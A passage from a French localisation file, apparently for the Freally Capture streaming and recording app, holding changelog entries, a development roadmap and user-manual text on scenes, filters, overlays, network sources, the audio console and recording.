derrière l'interface maison <code>fcap-capture</code>, qui fournit des images horodatées, prêtes à être envoyées au GPU, via un canal où la plus récente l'emporte, avec un décompte honnête des images perdues :","changelog.871ef2f6ec64":"<strong>Windows</strong> — DXGI Desktop Duplication pour les écrans (avec fusion du pointeur de la souris ; la duplication exclut le curseur) et <strong>Windows.Graphics.Capture</strong> pour les fenêtres individuelles (Windows 10 1903+), qui survivent aux changements de mode d'affichage et aux redimensionnements de fenêtre.","changelog.6beba9cca1b5":"<strong>macOS</strong> — <strong>ScreenCaptureKit</strong> (écrans + fenêtres, macOS 12.3+) ; l'autorisation d'enregistrement de l'écran est demandée d'emblée, et un refus affiche un lien direct <strong>Ouvrir les réglages d'enregistrement de l'écran</strong> au lieu d'une image noire silencieuse. (Version minimale du paquet relevée de 12.0 à 12.3 — ScreenCaptureKit n'existe pas en dessous de 12.3.)","changelog.181ee179e017":"<strong>Linux</strong> — le <strong>portail ScreenCast</strong> (<code>ashpd</code> → PipeWire) sous Wayland, où c'est la <em>boîte de dialogue du système</em> qui choisit l'écran ou la fenêtre (la seule capture que Wayland autorise — le sélecteur le dit clairement), plus un chemin <strong>X11</strong> direct (écrans + fenêtres <code>_NET_CLIENT_LIST</code>) dans les sessions X.","changelog.2c3347e661da":"Sources <strong>webcam / carte d'acquisition</strong> via <code>nokhwa</code> (Media Foundation / AVFoundation / V4L2) : énumération des périphériques, liste des formats par périphérique (résolution / fps / format de transport), images RGBA en direct et parcours d'autorisation de la caméra sous macOS (<code>NSCameraUsageDescription</code> inclus).","changelog.eb1065b2fc17":"<strong>Aperçu du programme en direct</strong> : le « + » du rail Sources fonctionne désormais — sélecteurs Capture d'écran, Capture de fenêtre et Périphérique de capture vidéo ; la source choisie s'affiche en direct dans l'aperçu du programme avec une superposition libellé / résolution / fps mesurés / images perdues. Le canal est interne au processus de bout en bout (capture → JPEG → le schéma privé de l'application <code>preview://</code> → canvas) — les images ne touchent jamais un socket ni le disque. Le dessin direct prouve le fonctionnement du canal ; le compositeur wgpu prend le relais dans 0.40.0.","changelog.e3fc6c640b84":"<strong>Tests de fumée sur du vrai matériel</strong> (gardés en <code>--ignored</code> sur la CI sans écran) : capture d'écran, de fenêtre et de webcam vérifiées avec de vraies images sur du vrai matériel.","changelog.c326134a5d1e":"Les images de l'aperçu restent <strong>dans le processus</strong> (un schéma d'URI personnalisé — pas de socket localhost, pas de fichiers temporaires) ; la posture est inchangée : zéro appel réseau sortant, pas de comptes, pas de télémétrie.","changelog.38a90eaf4fce":"Les refus d'autorisation du système (Enregistrement de l'écran / Caméra sous macOS) sont signalés honnêtement, avec un lien direct vers les réglages.","changelog.c6a63e383dbf":"Nouvelles mentions tierces : <code>pipewire</code> + <code>x11rb</code> (capture sous Linux) et <code>mozjpeg</code> (décodage MJPEG des webcams) + <code>jpeg-encoder</code> (encodage de l'aperçu) — ces deux derniers relèvent de la licence <strong>IJG</strong>, désormais mentionnée dans <code>THIRD-PARTY-NOTICES.md</code> et autorisée dans <code>deny.toml</code>.","changelog.2f1e03606026":"<span class=\"release__meta\"><span class=\"release__ver\">v0.10.0</span><time class=\"release__date\" datetime=\"2026-07-01\">2026-07-01</time></span><span class=\"release__title\">(Fondations et dépôt)</span>","changelog.4648ce7198c9":"Interface de contrôle <strong>Tauri v2 + React 19 / TypeScript / Vite 7 / Tailwind 4</strong> (Havoc sombre) au-dessus d'un espace de travail Cargo en Rust : la crate d'application <code>freally-capture</code> + les crates moteur maison <code>fcap-*</code> (<code>capture</code>, <code>sources</code>, <code>compositor</code>, <code>scene</code>, <code>audio</code>, <code>encode</code>, <code>stream</code>), toutes en <code>#![forbid(unsafe_code)]</code>.","changelog.b146fa224118":"La <strong>disposition en docks du studio</strong> (grand aperçu du programme, rails Scènes/Sources, Console audio, Contrôles, Statistiques), avec des états « pas encore implémenté » honnêtes sur chaque commande.","changelog.6b08ed4da71e":"Le <strong>pont typé interface ↔ cœur</strong> : <code>health()</code> (versions de l'application + des crates du cœur liées), <code>settings_get</code>/<code>settings_set</code>, et un événement poussé <code>stats</code> à ~2 Hz affiché en direct dans le dock de statistiques (données provisoires, signalées comme telles jusqu'à l'échantillonnage réel dans 0.70.0).","changelog.29f30cb39613":"Le <strong>magasin de paramètres</strong> : du JSON dans le dossier de configuration du système, écritures atomiques fichier temporaire + renommage, solutions de repli en cas de fichier corrompu ou manquant ; la bascule du dock de statistiques est conservée d'une exécution à l'autre.","changelog.68352e507bf1":"<strong>Matrice de CI</strong> (Windows/macOS/Linux) : rustfmt, clippy <code>-D warnings</code>, tests, cargo-deny + cargo-audit, prettier/eslint/tsc/vitest/build pour l'interface, et builds de débogage Tauri par système ; un <strong>workflow de publication</strong> déclenché par tag (programmes d'installation par système → brouillon de Release GitHub).","changelog.77fbaa6cd383":"La <code>LICENSE</code> propriétaire + les documents de gouvernance et le site GitHub Pages initial <code>docs/</code>, avec l'icône du badge true-alpha.","changelog.b36a760b89c7":"<strong>Version Windows vérifiée</strong> : application graphique <strong>sans fenêtre de console</strong> (vérifié sur le binaire compilé) ; les programmes d'installation MSI + NSIS se construisent.","changelog.5da8006aa5c6":"<strong>Zéro appel réseau sortant</strong> dans l'application ; une CSP stricte ; uniquement la capacité minimale <code>core:default</code> ; les clés de stream et les secrets ne sont pas stockés (il n'en existe pas encore) ; <strong>aucune IA ni apprentissage automatique nulle part</strong> (charte).","changelog.62e65d7911da":"Prévu — 0.25.0 (Le cœur de la capture)","changelog.216d50682cb6":"Capture d'écran et de fenêtre par système (Windows DXGI + Windows.Graphics.Capture ; macOS ScreenCaptureKit ; Linux portail PipeWire + X11) derrière une interface <code>Capture</code>.","changelog.22b2b1c3d027":"Entrée webcam / carte d'acquisition via <code>nokhwa</code> ; un aperçu du programme en direct.","changelog.8716e909baa8":"Prévu — 0.40.0 (Compositeur + scènes/sources)","changelog.42125f1329d8":"Le compositeur GPU <code>wgpu</code> maison : transformation/rognage/échelle/rotation par source, modes de fusion et chaîne de filtres vidéo (incrustation chroma, correction des couleurs, LUT, flou, masque, netteté, défilement).","changelog.5e0cc21c74cc":"Le modèle de données scène/source/filtre maison ; l'ensemble complet des sources (image, texte, couleur, média, navigateur) ; les rails Scènes + Sources avec poignées de transformation sur le canevas.","changelog.25af1c9ae9bd":"Prévu — 0.55.0 (Console audio + enregistrement)","changelog.c33ce0f2f787":"Le graphe audio <code>cpal</code> : volume/coupure/monitoring par source, jusqu'à 6 pistes, décalage de synchro, ducking, appuyer pour parler, un indicateur LUFS et des filtres (débruitage DSP classique maison — sans apprentissage automatique — plus gate, compresseur, limiteur, égaliseur, gain).","changelog.e1afeb62fe94":"Enregistrement multipiste via les encodeurs matériels (NVENC/Quick Sync/AMF/VAAPI/VideoToolbox) + repli x264, plus le codec sans perte maison <code>freally-video</code> ; conteneurs mp4/mkv/mov/webm ; découpage des fichiers ; copie locale à pistes séparées. Les codecs standard soumis à brevets via le pont ffmpeg à la demande, vérifié par hachage.","changelog.b03b02234da0":"Prévu — 0.70.0 (MVP du studio — première version publique)","changelog.2f588cc01f93":"Diffusion en direct vers une destination (RTMP/RTMPS) : Twitch/YouTube/Kick/Facebook/Trovo/personnalisé, avec reconnexion automatique et délai de diffusion ; l'enregistrement principal continue quel que soit l'état du stream.","changelog.8591c913ffa0":"Mode Studio (aperçu/programme) + transitions (coupe/fondu/glissement/balayage/stinger/volet luma) ; la caméra virtuelle (par système) ; raccourcis globaux ; profils + collections de scènes ; le dock de statistiques. <strong>Première version publique — entièrement gratuite, comme toutes les applications Freally.</strong>","changelog.ae9d61fc4bdf":"Prévu — 0.85.0 (Multistream / SRT / WHIP + scènes, sources et encodeurs en profondeur)","changelog.384e7dfb96e1":"Multistream simultané vers plusieurs destinations, directement vers chaque plateforme ; protocoles SRT et WHIP ; sortie verticale/multi-canevas.","changelog.0cb0b6d267f0":"Le tampon de replay continu avec préréglages ; scènes imbriquées, groupes de sources + audio par scène ; une source diaporama d'images + des préréglages de cartes d'acquisition ; filtres d'incrustation couleur/luma + délai de rendu ; sortie haute fréquence d'images/4K, gestion de l'espace colorimétrique + réduction de la résolution de sortie ; marqueurs de stream côté enregistrement ; caméra virtuelle en profondeur (source unique + audio) ; packs premium de stingers + luma ; filtres avancés.","changelog.060db9595543":"Prévu — 1.0.0 (API à distance, scripts, capture de jeu et lancement)","changelog.26a3256fb4c7":"L'API de contrôle à distance WebSocket (façon Stream Deck / Companion) + docks navigateur ; scripts Lua/JS + un SDK de plugins.","changelog.bde34ffd89b3":"Capture de jeu (interception des API GPU DX/GL/Vulkan, signalée honnêtement) ; NDI + VST en option.","changelog.fdf05cb85cbf":"Installateurs signés/notarisés (Win MSI/NSIS, macOS .app/.dmg + le plugin de caméra virtuelle, Linux AppImage/.deb/.rpm/Flatpak) + mise à jour automatique auto-hébergée.","changelog.28cee61c3ca1":"Accessibilité (clavier d'abord, libellés pour les lecteurs d'écran, contraste élevé) et localisation de l'interface en 18 langues (<code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>, l'anglais en premier, l'arabe de droite à gauche) ; accueil des nouveaux utilisateurs + modèles.","manual.831d0f72d242":"Premiers pas","manual.f2f53974b760":"Freally Capture est un studio de bureau pour Windows, macOS et Linux. Ce manuel décrit la version 1.2.1, la version actuelle.","manual.4b5f10daa08b":"Ouvrez Freally Capture. Au premier lancement, l'application vous demande d'accepter son contrat de licence ; un assistant de configuration examine ensuite votre carte graphique et votre processeur et vous propose un encodeur, une taille de canevas et un débit, en expliquant chaque choix.","manual.fe88634050bf":"Le studio s'ouvre sur l'aperçu du programme, avec les docks <strong>Scènes</strong>, <strong>Sources</strong>, <strong>Console</strong> et <strong>Contrôles</strong>. Il n'y a ni compte ni connexion.","manual.4c937d2528ca":"Sous <strong>macOS</strong>, autorisez l'<strong>Enregistrement de l'écran</strong> — ainsi que la <strong>Caméra</strong> et le <strong>Microphone</strong> si vous les utilisez — dans Réglages Système → Confidentialité et sécurité, puis rouvrez l'application. Sous <strong>Linux avec Wayland</strong>, c'est la boîte de dialogue du bureau lui-même qui vous demande quel écran ou quelle fenêtre partager.","manual.adc8f305f8f8":"Ajoutez votre première source (voir <a href=\"#build-a-scene\">Composer une scène</a>) et vous êtes prêt à enregistrer ou à passer en direct.","manual.46e49bd74b1d":"Composer une scène","manual.f779d891c1f2":"Une scène est une pile de sources assemblées sur la carte graphique. Une même source peut être partagée par plusieurs scènes.","manual.5a1c5f778fdb":"Dans le dock <strong>Sources</strong>, cliquez sur <strong>Ajouter une source</strong> et choisissez un type : <strong>Écran</strong>, <strong>Fenêtre</strong>, <strong>Jeu</strong>, <strong>Webcam / Carte d'acquisition</strong>, <strong>Navigateur</strong>, <strong>Média</strong>, <strong>Image</strong>, <strong>Texte</strong>, <strong>Couleur</strong> ou <strong>Audio</strong>.","manual.2a2d9e2015b5":"Ajoutez une <strong>Capture d'écran</strong> : votre écran remplit l'aperçu du programme.","manual.80c8e9c8176f":"Ajoutez une source <strong>Webcam</strong>, faites-la glisser dans un coin du canevas et redimensionnez-la avec ses poignées.","manual.264150f36676":"Ajoutez une incrustation <strong>Image</strong> ou <strong>Navigateur</strong> par-dessus. L'ordre de la liste est l'ordre sur le canevas : le haut de la liste est au premier plan.","manual.a329c46899d6":"Créez d'autres scènes dans le dock <strong>Scènes</strong> — par exemple « Bientôt en direct », « Gameplay » et « Je reviens tout de suite » — et passez de l'une à l'autre.","manual.9c8d5730d1bb":"<strong>Astuce :</strong> modifiez une seule fois les propriétés d'une source partagée, et le changement s'applique à toutes les scènes qui l'utilisent.","manual.fd869e76d280":"<strong>L'aperçu :</strong> sous Windows, macOS et Linux avec X11, l'aperçu du programme est dessiné directement par la carte graphique, si bien que déplacer, redimensionner et faire pivoter réagissent instantanément. Sous Wayland, un aperçu standard est utilisé, avec la même édition sur le canevas.","manual.87eca68fecaa":"Filtres et transitions","manual.36a962cf3902":"Empilez des filtres sur chaque source, sur la carte graphique, et choisissez comment une scène cède la place à la suivante.","manual.4708b4dbab34":"Ajouter une incrustation chroma","manual.9df34cebcaf5":"Faites un clic droit sur une source — une caméra devant un fond vert, par exemple — et choisissez <strong>Filtres</strong>.","manual.9981601a6174":"Ajoutez <strong>Incrustation chroma</strong> et réglez la <strong>Couleur clé</strong>, la <strong>Similarité</strong>, le <strong>Lissage</strong> et le <strong>Débordement</strong> : la couleur incrustée disparaît en direct sur le canevas.","manual.b76bd309a9f6":"Ajoutez d'autres filtres selon vos besoins — <strong>Correction des couleurs</strong>, <strong>LUT</strong>, <strong>Flou</strong>, <strong>Masque</strong>, <strong>Netteté</strong> — et faites-les glisser pour réordonner la chaîne.","manual.db41fe5a40e4":"Choisir une transition","manual.bea9e11be98d":"Dans <strong>Contrôles</strong>, ouvrez le sélecteur de transition, choisissez <strong>Coupe</strong>, <strong>Fondu</strong>, <strong>Glissement</strong>, <strong>Balayage</strong>, <strong>Stinger</strong> ou <strong>Volet luma</strong>, et réglez une durée.","manual.eada58ce5b2e":"Pour un <strong>Stinger</strong>, choisissez le média et son point de transition ; pour un <strong>Volet luma</strong>, choisissez le dégradé et sa douceur.","manual.79756cb8b209":"Changez de scène pour voir la transition se jouer. En mode Studio, elle se joue lorsque vous envoyez l'aperçu au programme.","manual.2c0c025b4264":"Compositeur et effets visuels","manual.b768e85eff32":"Inclinaison 3D, incrustations de sortie, image figée et clonage, une famille de flous, transitions de déplacement avec règles, un studio de shaders, masques de Bézier et stingers à cache de piste.","manual.d2b720eca5a5":"Inclinaison 3D et perspective","manual.d665cc2f2296":"Ouvrez <strong>Modifier la transformation</strong> sur un élément et réglez <strong>Inclinaison X</strong>, <strong>Inclinaison Y</strong> et une intensité de <strong>Perspective</strong> pour placer la source en 3D. Une transformation sans inclinaison s'affiche exactement comme avant.","manual.c4077ba2b72d":"Incrustations de sortie","manual.d4220af54ed9":"Ouvrez <strong>Outils → Incrustations de sortie</strong> et ajoutez n'importe quelle source comme calque au-dessus de la <strong>Sortie programme</strong>, par-dessus chaque scène et à travers chaque changement de scène — un logo de chaîne, un badge EN DIRECT, un bandeau de titre.","manual.0677e571c1f8":"Réordonnez les calques et réglez pour chacun l'opacité, la position, la taille et l'activation. Ils apparaissent de la même façon dans l'aperçu, l'enregistrement, le stream et la multivue.","manual.1e484119e149":"Image figée et clonage de source","manual.4cdb8e22f58b":"Faites un clic droit sur une source, ouvrez <strong>Filtres</strong> et ajoutez <strong>Figer</strong> : la dernière image est maintenue à la fois dans le programme, l'aperçu, l'enregistrement et le stream. Désactivez le filtre pour relancer l'image.","manual.59fd957b48dc":"Cliquez sur le bouton <strong>Cloner</strong> (⧉) sur la ligne d'une source pour placer un même flux dans plusieurs scènes ou à plusieurs endroits, chaque clone ayant sa propre transformation et ses propres filtres.","manual.a90410d6b30c":"Flous","manual.eeb69e428aa3":"Dans les <strong>Filtres</strong> d'une source, ajoutez l'un des flous proposés en plus du flou gaussien : <strong>directionnel</strong> (une traînée de mouvement selon un angle), <strong>radial</strong> (une rotation autour d'un centre), <strong>zoom</strong> (une traînée façon travelling compensé) ou <strong>pixelliser</strong> (une mosaïque).","manual.54261c9f6b8f":"La transition de déplacement et les règles de transition","manual.ef17a04962be":"Choisissez la transition <strong>Déplacement</strong> : les éléments présents dans les deux scènes glissent de leur ancienne position, échelle, rotation et rognage vers les nouveaux au lieu de couper, et les éléments présents dans une seule scène apparaissent ou disparaissent en fondu.","manual.e31792f9e737":"Ouvrez <strong>Outils → Règles de transition</strong> pour donner à une paire de scènes sa propre transition et sa propre durée. Pour l'entrée propre à un élément, réglez un fondu d'apparition <strong>Révélation</strong> dans <strong>Modifier la transformation</strong>.","manual.bb4e30a1ea68":"Le studio de shaders WGSL","manual.e475acf03bea":"Ajoutez un <strong>effet WGSL utilisateur</strong> comme filtre et modifiez-le en direct. Ses curseurs sont créés à partir des annotations <code>// @param</code>, et une galerie intégrée propose niveaux de gris, inversion, lignes de balayage et vignettage.","manual.424ca3316822":"<strong>Astuce :</strong> un shader est compilé et vérifié pendant la saisie. Un shader invalide est ignoré et la source s'affiche sans filtre — jamais de plantage.","manual.c24e8b5ee2c0":"Masques de Bézier","manual.37870edaacbc":"Ajoutez le filtre <strong>masque à main levée</strong> et tracez un chemin fermé : faites glisser les poignées, double-cliquez pour ajouter un point, faites un clic droit pour en supprimer un. Il propose des formes prédéfinies, un adoucissement pour chaque bord et l'inversion.","manual.f44ad1306530":"Exportez n'importe quel chemin en motif de <strong>volet luma</strong> en niveaux de gris pour réutiliser la forme comme transition.","manual.e4c8b0c52b3e":"Stingers à cache de piste","manual.b35494db6ce6":"Réglez un stinger pour qu'il porte sa transparence sous forme de <strong>cache de piste</strong>, le remplissage et le cache étant <strong>côte à côte</strong> ou <strong>empilés</strong>, afin que la transparence survive aux codecs qui la suppriment (H.264 et HEVC). Vous pouvez aussi <strong>atténuer l'audio du programme</strong> sous le son propre du stinger pendant sa lecture.","manual.3879f0c73d18":"Incrustations et autres sources","manual.cea21c089e39":"Replay, playlists, titres, vumètres, une incrustation de statistiques, des minuteurs, une incrustation des entrées et deux flux réseau, le tout depuis le menu <strong>+ / Ajouter une source</strong> du dock <strong>Sources</strong>.","manual.4a459b922e4b":"Ralenti instantané","manual.2e042aa67065":"Armez d'abord le tampon de replay (<strong>Armer le replay</strong> dans le dock <strong>Contrôles</strong>), puis choisissez <strong>Replay instantané</strong> dans <strong>+ / Ajouter une source</strong> et placez-le dans une scène.","manual.d7645da473a6":"Faites passer les dernières secondes dans le programme avec votre raccourci de replay — copiées sans réencodage et lues à <strong>100 %</strong>, <strong>50 %</strong> ou <strong>25 %</strong> de la vitesse, ralenties plutôt que complétées par des images inventées. Vous pouvez parcourir ou mettre en pause pendant la lecture.","manual.5b8095e70de0":"À la fin, la source s'efface d'elle-même, et l'émission revient seule au direct.","manual.6433eaab9b10":"<strong>Astuce :</strong> le ralenti est volontairement muet : un son ralenti serait brouillé, il est donc omis plutôt que simulé.","manual.f0b63d46cd74":"Playlist média et musique de fond","manual.37ed12f9d130":"Ajoutez <strong>Playlist média (sans coupure)</strong> et constituez une liste ordonnée avec, pour chaque élément, des points d'entrée et de sortie et des points de repère. Toute la liste passe par un seul décodeur, si bien que les raccords sont exacts à l'image près et réellement sans coupure.","manual.ef41fa6ad9b5":"Choisissez le mode de lecture — <strong>Boucle</strong>, <strong>Aléatoire</strong> ou <strong>garder le dernier</strong> — et parcourez-la avec les raccourcis suivant et précédent. Une playlist uniquement audio affiche le <strong>nom du morceau en cours</strong> sur le canevas et passe par sa propre tranche de la console ; cliquez sur le bouton <strong>Monitoring</strong> de cette tranche pour l'écouter.","manual.6e641ae2bd92":"Pour une musique qui joue sans rien afficher à l'écran, choisissez plutôt <strong>+ / Ajouter une source → Musique de fond…</strong> et sélectionnez un ou plusieurs fichiers <code>.mp3</code>, <code>.wav</code> ou <code>.flac</code>, en ordre aléatoire si vous le souhaitez. Le son propre d'une vidéo d'arrière-plan est alors coupé, pour qu'on n'entende jamais qu'une seule chose.","manual.b9aad55133bf":"Le concepteur de titres et de tableaux de score","manual.5382c093aaef":"Ajoutez <strong>Titre / Tableau de score</strong> pour ouvrir le concepteur : empilez des calques <strong>Texte</strong>, <strong>Image</strong> et <strong>Forme</strong>, avec du texte à contour et ombré et des animations d'entrée et de sortie (fondu, glissement, volet).","manual.7b8fea70655a":"Liez des champs à un fichier surveillé (une cellule CSV ou un pointeur JSON) ou à une variable du studio, puis pilotez-le en direct : changez un nom, modifiez le score ou lancez l'animation sans toucher à la scène.","manual.88a9422e37a9":"Le visualiseur audio","manual.87f4a5bdd624":"Ajoutez <strong>Visualiseur audio</strong> et choisissez un style — <strong>Barres de spectre</strong>, un <strong>Oscilloscope</strong> ou des <strong>Vumètres</strong> stéréo — puis liez-le à n'importe quelle tranche de la console, à une piste ou au mix master. Il affiche aussi le son d'une vidéo d'arrière-plan.","manual.0ae90a461adb":"Dans les <strong>Propriétés</strong> de la source, activez <strong>Couleurs classiques</strong> pour les bandes verte, jaune et rouge, ou laissez l'option désactivée pour une seule couleur unie. La taille, le nombre de barres et la vitesse de retombée s'y trouvent aussi.","manual.0d1ceffb08ba":"<strong>Astuce :</strong> le visualiseur écoute <strong>après le fader</strong>, si bien qu'une source coupée s'affiche à plat : il montre exactement ce que vous entendez.","manual.ec642e1cf0cc":"L'incrustation de statistiques, le chronomètre de splits et l'incrustation des entrées","manual.6b4fe6f81cb0":"Ajoutez <strong>Statistiques de performance (HUD)</strong> pour afficher sur le canevas les chiffres mesurés du dock de statistiques — images par seconde, processeur, mémoire, temps de composition GPU, images perdues et débit en direct —, chaque ligne pouvant être activée ou non. L'utilisation du GPU est volontairement absente, car elle n'est pas mesurée.","manual.cbd8a4b88736":"Ajoutez <strong>Chronomètre de splits (speedrun)</strong>, importez un fichier LiveSplit <code>.lss</code>, et lancez-le avec des raccourcis globaux pour valider un split, annuler, sauter et réinitialiser, en comparaison avec votre record personnel, vos meilleurs segments ou la moyenne. Le fichier est seulement lu ; aucune course n'y est jamais réécrite.","manual.fbf4bbeaf903":"Ajoutez <strong>Incrustation des entrées (touches/manette)</strong> pour afficher en direct le clavier, la souris et la manette, dans l'une des quatre dispositions proposées (WASD, un clavier compact, une manette à deux sticks, un stick arcade 8 directions). Le clavier et la souris fonctionnent sous Windows ; les manettes fonctionnent sur les trois systèmes.","manual.bf794edb3c25":"La barre des réseaux sociaux et des chaînes","manual.5f898056ef11":"Ajoutez <strong>Barre des réseaux sociaux</strong> depuis <strong>+ / Ajouter une source</strong> : un panneau qui liste vos identifiants. Choisissez une plateforme pour chaque ligne — <strong>YouTube, Twitch, Kick, X, Instagram, TikTok, Facebook, Discord</strong> sous forme de badges colorés, ou <strong>Personnalisé</strong> avec votre propre libellé et votre propre couleur — et saisissez l'identifiant (par exemple <code>@mychannel</code>). Ajoutez si vous le souhaitez une ligne d'en-tête (« Suivez-moi »), réordonnez les lignes et réglez la taille et les couleurs du texte.","manual.1dab9389547a":"Chaque champ reste modifiable dans les <strong>Propriétés</strong> de la source. Les lignes sans identifiant sont ignorées : vous pouvez donc garder une liste complète et ne remplir que ce que vous utilisez.","manual.1a4ac3c2e0bf":"Le message de chat en vedette","manual.c5d58a7d58be":"Ouvrez <strong>Outils → Message de chat en vedette…</strong> (ou la palette de commandes). La fenêtre liste les lignes les plus récentes de chaque incrustation de chat en cours : cliquez sur <strong>Mettre en vedette</strong> sur l'une d'elles pour l'épingler au programme sous forme de bandeau, visible par les spectateurs du stream et dans l'enregistrement.","manual.162d364796a2":"Réglez les couleurs du <strong>bandeau</strong> et du <strong>texte</strong> dans la boîte de dialogue, et cliquez sur <strong>Retirer</strong> pour le retirer de l'antenne. L'épinglage lui-même disparaît au redémarrage, par conception : la dédicace d'hier ne vient jamais hanter l'émission d'aujourd'hui.","manual.89a84c53e014":"Mise en évidence du curseur et effets de clic","manual.d0a5d9fb047d":"Faites un clic droit sur une capture d'écran ou de fenêtre, ouvrez <strong>Filtres</strong> et ajoutez <strong>Effets du curseur</strong> : un <strong>Halo du curseur</strong> (couleur et rayon), des <strong>Ondes de clic</strong> de couleurs différentes pour le clic gauche et le clic droit, et, en option, l'<strong>Affichage des touches</strong> à côté du pointeur. Les modifications s'affichent en direct.","manual.4a17c44757e4":"<strong>Remarque :</strong> les effets du curseur ne fonctionnent que sous Windows ; macOS et Linux dessinent eux-mêmes le curseur. L'incrustation des entrées et l'affichage des touches ne lisent les entrées <strong>que lorsqu'ils sont activés</strong>, et les dessinent directement dans l'image : rien n'est stocké ni journalisé.","manual.8bdb1aadf964":"Sources réseau : réception en réseau local et Freally Link","manual.797fe86a1fe8":"Ajoutez <strong>Réception en réseau local (récepteur SRT/RTMP)</strong> pour ouvrir un récepteur sur cet ordinateur, puis pointez une application caméra de téléphone, un encodeur ou un second ordinateur vers l'adresse affichée (avec un QR code). Le flux arrive dans la scène avec sa propre tranche dans la console. SRT peut utiliser une phrase secrète AES facultative ; RTMP n'a pas d'authentification propre, c'est pourquoi le formulaire privilégie SRT.","manual.e2761818ccef":"Pour partager entre deux exemplaires de Freally Capture, activez la sortie <strong>Freally Link</strong> sur l'ordinateur <strong>émetteur</strong> et définissez sa <strong>Clé d'appairage</strong> — impossible de l'activer sans clé. Sur l'ordinateur <strong>récepteur</strong>, ajoutez <strong>Freally Link (autre instance)</strong>, cliquez sur <strong>Scanner le réseau local</strong> et saisissez la clé : le programme de l'émetteur apparaît comme une source. Aucun des deux côtés n'a besoin de ffmpeg, et un récepteur sans la clé ne voit jamais la moindre image.","manual.a793cb271e32":"<strong>Remarque :</strong> les deux sources réseau sont <strong>désactivées tant que vous ne les ajoutez pas</strong>, restent sur votre propre réseau et ne touchent jamais Internet : rien ne vous découvre, et rien n'appelle l'extérieur.","manual.de10be5dcf2c":"Le compte à rebours « Bientôt en direct »","manual.71b47ef78ea4":"Un écran d'attente avant l'émission en un clic : un grand compte à rebours jusqu'à l'heure du direct, sur une image, un GIF, une vidéo, un dégradé ou de la musique, qui clignote à zéro et attend que vous passiez à l'émission.","manual.303493002776":"Ajouter le compte à rebours","manual.f78f2994b5d5":"Dans le dock <strong>Sources</strong>, ouvrez <strong>+ / Ajouter une source</strong> et choisissez <strong>Bientôt en direct…</strong>. Un compte à rebours plein canevas — une légende au-dessus d'un grand nombre — est placé dans la scène.","manual.c4bff5a4f06e":"Saisissez la <strong>légende</strong> (« Bientôt en direct », « Je reviens tout de suite »), puis réglez l'heure avec le <strong>sélecteur d'heure</strong> : une <strong>heure</strong> (1–12), une <strong>minute</strong> par pas de cinq minutes, et <strong>AM</strong> ou <strong>PM</strong>. La source décompte jusqu'à cette heure de la journée.","manual.59b00df516f1":"À zéro, le compte à rebours <strong>clignote et reste sur 0:00:00</strong> — il ne change jamais de scène tout seul. Passez à votre scène en direct quand vous êtes prêt. Chaque champ reste modifiable dans les <strong>Propriétés</strong> de la source.","manual.1dfb2d817d39":"Choisir un arrière-plan","manual.edc2450aeecd":"Choisissez le remplissage : un <strong>Dégradé</strong> de deux couleurs (par défaut), une couleur <strong>Unie</strong>, une <strong>Image</strong> (cliquez sur <strong>Parcourir…</strong>), ou <strong>Transparent</strong> pour laisser apparaître une source située en dessous.","manual.07a5fd9ac032":"Choisissez un fichier <strong>GIF</strong> ou <strong>vidéo</strong> : il tourne en boucle derrière les chiffres, <strong>mis à l'échelle et centré</strong>, si bien que toute l'image est visible et que rien n'est rogné.","manual.1cda5be75376":"Ajoutez une <strong>Musique de fond</strong> avec le bouton <strong>Parcourir…</strong> de la boîte de dialogue (MP3, WAV, FLAC, M4A, AAC, OGG ou Opus). Elle tourne en boucle, vous l'entendez dans l'aperçu, et elle fait partie de l'enregistrement et du stream. Le son propre d'une vidéo d'arrière-plan est coupé, pour qu'on n'entende jamais qu'une seule chose.","manual.b39b6b7add20":"<strong>Astuce :</strong> pour une musique derrière un écran simple, laissez l'arrière-plan sur Dégradé ou Transparent et ajoutez la musique : un compte à rebours épuré avec une bande-son.","manual.84f506f4fca5":"La console audio","manual.480e299c8728":"Mixez chaque source audio, envoyez-la vers jusqu'à 6 pistes et nettoyez le son de votre microphone — le tout en direct.","manual.bcbc220b3e63":"Chaque source audio est une tranche de la <strong>Console</strong> : son nom, un vumètre, un fader, la coupure, le monitoring, les filtres et les points de piste (1–6).","manual.03b920dc5376":"Faites glisser un fader pour régler le niveau, cliquez sur <strong>Muet</strong> ou <strong>Monitoring</strong>, et envoyez la source vers n'importe laquelle des 6 pistes.","manual.9a9991c7dc36":"Ouvrez les <strong>filtres</strong> d'une source et ajoutez <strong>Débruitage</strong> (traitement du signal classique, sans IA), <strong>Noise Gate</strong>, <strong>Compresseur</strong>, <strong>Limiteur</strong>, <strong>Égaliseur</strong> ou <strong>Gain</strong>.","manual.1a58b91bc5aa":"Attribuez un raccourci <strong>Appuyer pour parler</strong> ou <strong>Appuyer pour couper</strong>, et surveillez l'indicateur <strong>LUFS</strong> pour la sonie du programme.","manual.7158a36ed4d5":"<strong>Remarque pour macOS :</strong> macOS ne fournit pas de lui-même aux applications « ce que vous entendez ». Utilisez l'audio ScreenCaptureKit (macOS 13 ou ultérieur) lorsqu'il est disponible, ou installez un périphérique virtuel tel que BlackHole et choisissez-le comme source de l'audio système. Freally Capture vous guide et continue d'enregistrer même si une source ne peut pas s'ouvrir.","manual.bfdd510698ef":"Enregistrer","manual.e39b756fce99":"Enregistrez le programme sur plusieurs pistes avec l'encodeur matériel de votre carte graphique, ou sans perte dans le format propre à Capture.","manual.ad438c2dbf4b":"Dans <strong>Paramètres → Sortie</strong>, choisissez un encodeur. Freally Capture détecte <strong>NVENC</strong>, <strong>Quick Sync</strong>, <strong>AMF</strong>, <strong>VAAPI</strong> ou <strong>VideoToolbox</strong> et choisit le meilleur ; <strong>x264</strong> sur le processeur est toujours disponible comme solution de repli.","manual.3bc1870f8449":"Choisissez un conteneur — <strong>MP4</strong>, <strong>MKV</strong>, <strong>MOV</strong> ou <strong>WebM</strong> — ou le format sans perte propre à Capture, <strong>freally-video</strong> (<code>.frec</code>), qui ne nécessite aucune autre installation.","manual.e2a332927058":"Envoyez les sources vers des pistes audio (jusqu'à 6) pour que le microphone, le son du système et vos invités restent séparés au montage. Activez si vous le souhaitez le <strong>découpage des fichiers</strong> et <strong>une copie locale à pistes séparées pendant la diffusion</strong>.","manual.e0fa2f5a9430":"Cliquez sur <strong>Démarrer l'enregistrement</strong> dans <strong>Contrôles</strong>. Un point <strong>REC</strong> vert affiche la durée et le nombre de pistes. Cliquez sur <strong>Arrêter</strong> pour terminer le fichier.","manual.b1eb969490f1":"<strong>Remarque sur les codecs :</strong> le MP4 avec H.264 et AAC (ainsi que HEVC ou AV1) utilise des codecs couverts par des brevets, fournis par 